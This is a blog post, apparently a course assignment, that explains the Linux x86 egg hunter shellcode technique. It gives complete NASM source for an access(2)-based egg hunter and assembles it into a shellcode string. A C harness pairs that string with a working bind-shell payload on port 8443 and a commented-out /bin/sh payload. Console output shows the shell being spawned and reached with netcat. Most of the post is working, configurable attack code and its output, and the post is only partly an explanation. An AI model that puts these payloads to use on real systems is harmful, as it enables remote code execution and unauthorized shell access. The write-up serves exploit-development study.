---
layout: single 
title:  "Egg Hunter Shellcode"
date:   2020-03-13 05:54:06 +0800
categories: jekyll update
---

To execute arbitrary code, an attacker puts his shellcode in the available buffer space. **What if, the shellcode requires more space than the available space in the buffer?**

## Requirements

- Study about the Egg Hunter shellcode
- Create a working demo of the Egghunter
- Should be configurable for different payload

| *Note: Pretty much the entire post is extracted from [[1] Skape, Egghunter](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) and [[2] Shashi Kiran, Hunting the Egg: Egg Hunter](https://www.secpod.com/blog/hunting-the-egg-egg-hunter/)* |

## Egg Hunter

This is where the egg hunter technique is useful. Egg hunter is a small piece of shellcode which searches for an actual bigger shellcode which the attacker was not able to fit-in the available buffer space and redirect execution flow to it.
The egg hunter code searches for a "EGG" which is a unique string of 8 bytes made up of combining of two "TAG". A "TAG" is a 4 byte unique string. Usually attackers consider using string like "w00t", "lxxl" or any other strings which is unique enough to search in memory. An "EGG" is formed by combining two "TAG" to make it more unique, so that **it won’t come across itself while searching in memory**. The "EGG" is placed just before the "Shellcode" and the egg hunter code is placed in the small available buffer space while exploiting the overflows.
```
EGG = TAG + TAG i.e (lxxl) + (lxxl)
```
**Basic mechanism of exploiting a stack overflow using egg hunter:** When stack overflow occurs at some point it overwrites the EIP register (EIP points to next instruction to be executed). Then we should make EIP point to ESP where our shellcode will be present. In some cases shellcode might be just above the ESP, in that case we need jump back and execute shellcode which is egg hunter in this case, which searches for "EGG" in the entire memory and executes actual shellcode which is next "EGG". [[2] Hunting the Egg: Egg Hunter](https://www.secpod.com/blog/hunting-the-egg-egg-hunter/)

| ![[2] Hunting the Egg: Egg Hunter](/assets/img/assigment3_buffer.png) |
|:--:|
| *[[2] Hunting the Egg: Egg Hunter](https://www.secpod.com/blog/hunting-the-egg-egg-hunter/)* |

## Requirements of an Egg Hunter

- It must be robust : the egg hunter must be capable of searching through memory regions that are invalid and would otherwise crash the application if they were to be dereferenced improperly. It must also be capable of searching for the egg anywhere in memory
- It must be small: the smaller the better.
- It should be fast

## Implementation

From [[1] Skape, Egghunter](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf) i choose "method access(2) revisited", and here is the assembly code (with little bit adjustment). 

### Method: access(2) revisited

{% highlight nasm linenos %}
; access2.nasm
; egghunter: access(2) revisited
; http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

global _start

section .text

_start:
    xor edx, edx        ; zeroing edx

page_align:
    or dx, 0xfff        ; 4095 ~ 0xfff PAGE_SIZE

inc_addr:
    inc edx             ; inc memory pointer
    lea ebx, [edx+0x4]  ; ebx = memory address to test = arg of access ~ pathname 
    push byte 0x21      ; syscall access = 33 ~ 0x21
    pop eax             ; eax = 0x21
    int 0x80
    
    ; check return value of syscall access
    cmp al, 0xf2        ; compare if EFAULT=0xf2 (lower bytes)
    jz page_align       ; pointer is invalid, jump to next page

    ; if memory is valid
    mov eax, 0xdeafface ; eax = the egg
    mov edi, edx        ; edi = pointer value
    scasd               ; compare edi to dword eax (egg) 4 bytes
    jnz inc_addr        ; if no match go to next addr (jump to inc_addr)
    scasd               ; if first 4 bytes is matched, check another next 4 bytes if it's matched too
    jnz inc_addr        ; if no match go to next addr (jump to inc_addr)

    ; if egg is found (8 bytes), then execute the payload 
    jmp edi
{% endhighlight %}

## Analysis

The egghunter uses the `access` syscall to check if the virtual address space (VAS) address is valid by checking the `access` syscall return value. 

From the [man 2 access](http://man7.org/linux/man-pages/man2/access.2.html), following is the syntax of `access`:

{% highlight c %}
int access(const char *pathname, int mode); 
{% endhighlight %}

- `access()` checks whether the calling process can access the filepathname. If `pathname` is a symbolic link, it is dereferenced.
- The `mode` specifies the accessibility check(s) to be performed, and is either the value `F_OK`, or a mask consisting of the bitwise OR of one or more of `R_OK`, `W_OK`, and `X_OK`.

To get the systemcall number for `access` in ubuntu:
{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/egghunter$ grep access /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_access              33
{% endhighlight %}

From [man 2 access](http://man7.org/linux/man-pages/man2/access.2.html), `access()` may fail if:
- `EFAULT` pathname points outside your accessible address space.

The egghunter use this check if `access()` return `EFAULT` or not to verify valid memory addressess. The 
Error no `EFAULT` is 14 based on  `/usr/include/asm-generic/errno-base.h`, since the error code normally returned as a negative number, so this returned as -14, and converted in hex `0xfffffff2`. We can see on the code above, there is `cmp al, 0xf2` instruction which is checking the return value of `access` syscall.
{% highlight console %}
# EFAULT error no
kecebong@ubuntu:~/slae32/assigment/egghunter$ grep EFAULT /usr/include/asm-generic/errno-base.h
#define EFAULT          14      /* Bad address */

# negative -14 in hex for 32-bit
kecebong@ubuntu:~/slae32/assigment/egghunter$ python -c "print '0x{:x}'.format(-14 & (2**32-1))"
0xfffffff2
{% endhighlight %}

If the VAS is not valid (`EFAULT` returned from `access()`), it moves to the next page. If the VAS is valid, `scasd` instruction will compare the register `edi` which contains the pointer value to `eax` which contains the egg. If the first 4 bytes of `edi` is not the egg then it will jump to `inc_addr` which will go to the next address until it's found. If the first 4 bytes of `edi` is `0xdeafface`, it will check another next 4 bytes if it's matched too. If both 8 bytes is equal to `0xdeafface` `0xdeafface` which mean egg is found then the next instruction `jmp edi` will then execute the payload.

## Proof of Concept

First we'll need to compile and convert to hex our egghunter shellcode above.

{% highlight console %}
kecebong@ubuntu:~/slae32/assigment/egghunter$ make
[*] Assembling with nasm...
nasm -f elf32 -o access2.o access2.nasm

[*] Linking object...
ld -m elf_i386 -o access2 access2.o

[*] Size of Shellcode:
   text    data     bss     dec     hex filename
     35       0       0      35      23 access2

[*] Shellcode:
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\xce\xfa\xaf\xde\x89\xd7
\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"

[*] Compiling shellcode...
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
{% endhighlight %}

From above shellcode, we can see our egg `\xce\xfa\xaf\xde`.
![image](/assets/img/assigment3_shellcode.png)

and from here we can customize our egg on the script:

{% highlight c linenos %}
#include<stdio.h>
#include<string.h>

#define EGG "\xce\xfa\xaf\xde"

unsigned char stage1[] = \
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8"
EGG
"\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

// http://shell-storm.org/shellcode/files/shellcode-811.php
/*
unsigned char stage2[] = EGG EGG \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
*/

// assigment #1 - bind shell 0.0.0.0:8443
unsigned char stage2[] = EGG EGG \
"\x31\xc9\xf7\xe1\x99\x6a\x66\x58\x6a\x01\x5b\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x97"
"\x6a\x66\x58\x6a\x02\x5b\x52\x66\x68\x20\xfb\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1"
"\xcd\x80\x6a\x66\x58\x6a\x04\x5b\x31\xf6\x56\x57\x89\xe1\xcd\x80\x6a\x66\x58\x6a\x05"
"\x5b\x56\x56\x57\x89\xe1\xcd\x80\x89\xc3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x6a"
"\x0b\x58\x31\xc9\x51\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
  printf("Egg: %p\n", EGG);  
  printf("Stage1 Length:  %d\n", strlen(stage1));
  printf("Stage2 Length:  %d\n", strlen(stage2));

  int (*ret)() = (int(*)()) stage1;
  ret();
}
{% endhighlight %}

## Testing

{% highlight console linenos %}
kecebong@ubuntu:~/slae32/assigment/egghunter$ gcc -fno-stack-protector -z execstack egghunter.c \
 -o egghunter

kecebong@ubuntu:~/slae32/assigment/egghunter$ ./egghunter
Egg: 0x8048559
Stage1 Length:  35
Stage2 Length:  36
$ id
uid=1000(kecebong) gid=1000(kecebong) groups=1000(kecebong),4(adm),24(cdrom),27(sudo),30(dip),
46(plugdev),108(lpadmin),109(sambashare)
$ exit
kecebong@ubuntu:~/slae32/assigment/egghunter$
{% endhighlight %}

{% highlight console linenos %}
kecebong@ubuntu:~/slae32/assigment/egghunter$ gcc -fno-stack-protector -z execstack egghunter.c \
-o egghunter
kecebong@ubuntu:~/slae32/assigment/egghunter$ ./egghunter
Egg: 0x8048559
Stage1 Length:  35
Stage2 Length:  112

────────────────────────────────────────────────────────────────────────────────────────────────────────
kecebong@ubuntu:~$ lsof -i :8443
COMMAND    PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
egghunter 4071 kecebong    3u  IPv4  54368      0t0  TCP *:8443 (LISTEN)
kecebong@ubuntu:~$ nc -v 127.0.0.1 8443
Connection to 127.0.0.1 8443 port [tcp/*] succeeded!
id
uid=1000(kecebong) gid=1000(kecebong) groups=1000(kecebong),4(adm),24(cdrom),27(sudo),30(dip),
46(plugdev),108(lpadmin),109(sambashare)
{% endhighlight %}

### Demo
![image](/assets/img/assigment3.gif)

{% include_relative slae32.html %}

This pattern should be repeated before the real shellcode, as the egghunter also contains this pattern and we want to avoid the egghunter to jump into its code instead of the shellcode.
## Reference
- [[1] Skape, Egghunter](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
- [[2] Shashi Kiran, Hunting the Egg: Egg Hunter](https://www.secpod.com/blog/hunting-the-egg-egg-hunter/)
